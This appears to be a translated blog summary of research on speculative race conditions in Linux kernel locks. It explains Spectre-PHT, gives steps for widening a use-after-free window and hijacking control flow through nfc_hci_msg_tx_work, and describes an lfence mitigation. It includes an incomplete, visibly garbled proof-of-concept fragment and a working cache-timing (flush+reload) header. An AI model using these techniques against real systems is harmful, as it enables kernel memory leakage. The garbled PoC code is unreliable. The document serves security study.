# Background
## Spectre-PHT (Transient Execution)

To improve performance, modern CPUs execute instructions speculatively (that is, the CPU executes the likely outcome of a branch in advance).
Speculative execution has two possible outcomes:
a) The instructions are committed normally.
b) The instructions are squashed due to a misprediction, producing transient execution, but the related cache state is retained.
```cpp
if (x < array1_size) {
    y = array2[array1[x] * 0x1000];
}
```
1. x is attacker-controlled; after many iterations in which x < array1_size, the CPU predicts that x < array1_size is still likely and executes the statements inside the if.
2. If x is out of bounds but the CPU still assumes x < array1_size and executes the statements inside the if, the out-of-bounds content of array1[x] is brought into the cache, and array2[array1[x] * 0x1000] then accesses the corresponding location.
3. Via a side channel, if accessing a certain position of array2 is faster, that position likely corresponds to the out-of-bounds content of array1[x] — i.e., the content is leaked.

##   SRC/SCUAF and Experimental Conditions
SRC: two threads access the same memory location at the same time — one performs a write, the other a transient access; at that moment the transient access can bypass the mutex. This produces a Speculative Concurrent Use-After-Free (SCUAF), which is similar to concurrency bugs.

With all mitigations enabled, Linux kernel running on Intel x86-64, an unprivileged user triggers an SRC via system calls to leak data.

# The Workflow
![Image](/images/csdn/2024/csdn-144404942/image-002-03b184b36c.png)

The function nfc_hci_msg_tx_work is part of the Host Controller Interface (HCI) layer implementation of the Near Field Communication (NFC) driver core in the Linux kernel, responsible for processing pending messages sent from the kernel to NFC devices. Since we do not have the NFC hardware required to execute this function natively, we added a system call during the analysis to reach this code path.

## Creating an Unbounded UAF Window
![Image](/images/csdn/2024/csdn-144404942/image-004-1706d6f458.png)

Goal: create a large time window between the free and the setting of NULL.

Timer expiration triggers an interrupt.

First, a timer is set to trigger an interrupt during kfree; however, because the lock is held, the interrupt waits until the lock is released and then enters the timer's interrupt handler, whose execution time can be extended. During this period, other cores issue system calls that send interrupts to the victim core, trapping it in endless interrupts.


##  Crafting Speculative Race Conditions
![Image](/images/csdn/2024/csdn-144404942/image-005-2d29687b31.png)

The lock is fine at the macro level, but may be problematic at the micro level.

The branch on the fourth line ultimately checks the result of the lock cmpxchgq instruction, which atomically compares the current value of the mutex ptr with the old value old; if they are equal, it means the mutex can be locked — the mutex is set to the new value new and access to the protected critical region is granted — otherwise not.

We can acquire the mutex many times, so that during speculative execution the mutex is acquired and the protected critical region is entered.

Many other common write-side synchronization primitives are implemented with conditional branches, so they are all easily affected by speculative race conditions.

Experiments measured the number of instructions that can be executed during transient execution on different architectures with different core and thread arrangements.
![Image](/images/csdn/2024/csdn-144404942/image-006-1c05157228.png)

When two threads run across cores, the window is usually larger, which indicates that the cache coherence protocol plays a crucial role in propagating the lock's architectural state across cores before speculation terminates. (My understanding: after the first execution stream takes the lock, the other begins speculative execution; the original execution stream learns about the locked state slowly when checking the lock, so by then the speculative execution has already executed many instructions.)

## Exploiting Speculative Race Conditions

![Image](/images/csdn/2024/csdn-144404942/image-007-ad0b768443.png)
1. Allocate hdev and hdev->cmd_pending_msg.
2. Mistrain the mutex's conditional branch.
3. Start the victim thread and the storm thread: set the timer and launch the target function.
4. After free, execution enters the timer interrupt handler; at this point the window is enlarged and other functions run.
5. Within this window, create a msgbuf corresponding to hci_msg.
6. Use msgsnd to allocate an object the same size as hdev->cmd_pending_msg, obtaining the memory that was just freed, and set up cb and cb_context.
7. nfc_hci_msg_tx_work triggers transient speculative execution that hijacks the control flow.

```cpp
data_t *data_ptr;

    // 初始化锁 
    int r;

    // 初始化结构体

    data_ptr->callback = my_callback;

int main()

    init();

    train_lock();

    // 线程1：获取锁，释放结构体
    pthread_mutex_lock(&lock);
    free(data_ptr);

    // 线程2：线程1在free()之后但在状态更新和锁释放之前被中断。然后，线程2重用内存以控制未来的悬挂指针引用（并劫持控制流到恶意回调）。

    if (r == 0)

    }

    data_ptr = NULL;
    pthread_mutex_unlock(&lock);

    unsigned long t1 = probe_timing(&fr_buff[0]);
    unsigned long t2 = probe_timing(&fr_buff[4096]);
    if (t2 < t1)
    {
        printf("得到信号 (%lu < %lu): 内存重用、推测性UAF以及推测性控制流劫持成功触发。\n", t2, t1);
    }
    else
    {
        printf("意外的时间：%lu << %lu\n", t1, t2);
    }

    return 0;
}
```

```cpp
#ifndef FR_H
#define FR_H

// 定义 likely 宏，用于优化条件分支预测。
#define likely(expr) __builtin_expect(!!(expr), 1)

// 定义缓存行对齐属性宏，确保变量按照64字节边界对齐，并放置在特定的数据段中。
#define __cacheline_aligned \
  __attribute__((__aligned__(64), \
		 __section__(".data..cacheline_aligned")))

// 探测访问给定地址所需的时间。该函数使用汇编指令来测量读取一个内存位置前后的时钟周期数。
static inline unsigned long probe_timing(char *adrs) {
    volatile unsigned long time;

    asm __volatile__(
        "    mfence             \n" // 确保所有之前的存储操作已完成。
        "    lfence             \n" // 确保所有之前加载操作已完成。
        "    rdtsc              \n" // 读取时间戳计数器。
        "    lfence             \n" // 确保此指令前的所有加载都已完成。
        "    movl %%eax, %%esi  \n" // 将低32位时间戳保存到 ESI 寄存器。
        "    movl (%1), %%eax   \n" // 从内存位置加载数据（触发缓存行为）。
        "    lfence             \n" // 确保此指令前的所有加载都已完成。
        "    rdtsc              \n" // 再次读取时间戳计数器。
        "    subl %%esi, %%eax  \n" // 计算两次读取之间的时间差。
        "    clflush 0(%1)      \n" // 清除指定内存位置的缓存行。
        : "=a" (time)            // 输出参数：EAX 寄存器值赋给 'time'。
        : "c" (adrs)             // 输入参数：'adrs' 的值通过 ECX 寄存器传递。
        : "%esi", "%edx"         // 被修改的寄存器列表。
    );
    return time;
}

// 返回当前CPU的时钟周期数。rdtsc 指令读取时间戳计数器，它记录了自系统启动以来的时钟周期数。
static inline unsigned long long rdtsc() {
	unsigned long long a, d;
	asm volatile ("mfence"); // 确保所有之前的存储操作已完成。
	asm volatile ("rdtsc" : "=a" (a), "=d" (d)); // 读取时间戳计数器，分别放入 a 和 d。
	a = (d<<32) | a; // 组合 EDX:EAX 成一个64位时间戳。
	asm volatile ("mfence"); // 确保所有之前的存储操作已完成。
	return a;
}

// maccess 宏定义用于触发电平1缓存未命中，模拟内存访问。
#define maccess(p) \
  asm volatile ("movq (%0), %%rax\n" \
    : \
    : "c" (p) \
    : "rax")

// flush 宏定义用于清除指定内存位置的缓存行。
#define flush(p) \
    asm volatile ("clflush 0(%0)\n" \
      : \
      : "c" (p) \
      : "rax")

#endif
```

# Mitigation

1. **Serialization instruction (lfence)**:
   - `lfence` is a serializing instruction, mainly used to control the order of the instruction stream. It ensures that all operations before it complete before any subsequent instructions execute.
   - By inserting `lfence` after `cmpxchg`, it is ensured that once the locking operation completes, no subsequent operation is executed early. This prevents the processor from speculatively executing any critical-section code before the locking mechanism is confirmed.

2. **Implementation details**:
   - The file `arch/x86/include/asm/cmpxchg.h` in the Linux kernel was modified.
   - Specifically, the `lfence` instruction was added to the `__raw_cmpxchg` and `__raw_try_cmpxchg` assembly macros.
   - These macros are used to implement all write-side synchronization primitives; in this way, all related synchronization operations are protected.
